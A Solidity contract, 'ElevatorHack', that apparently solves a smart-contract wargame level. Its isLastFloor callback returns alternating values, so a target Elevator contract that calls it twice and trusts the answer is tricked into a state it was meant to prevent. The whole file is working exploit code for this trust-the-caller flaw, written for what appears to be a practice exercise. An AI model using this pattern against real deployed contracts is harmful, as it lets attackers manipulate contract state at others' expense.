// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IElevator {
    function goTo(uint256) external;
}

contract ElevatorHack {
    address elevator;
    bool previousValue;

    constructor(address elevator_) {
        elevator = elevator_;
    }
    function isLastFloor(uint256 floor) public returns (bool) {
        previousValue = !previousValue;
        return !previousValue;
    }

    function attack() public {
        IElevator(elevator).goTo(1);
    }
}
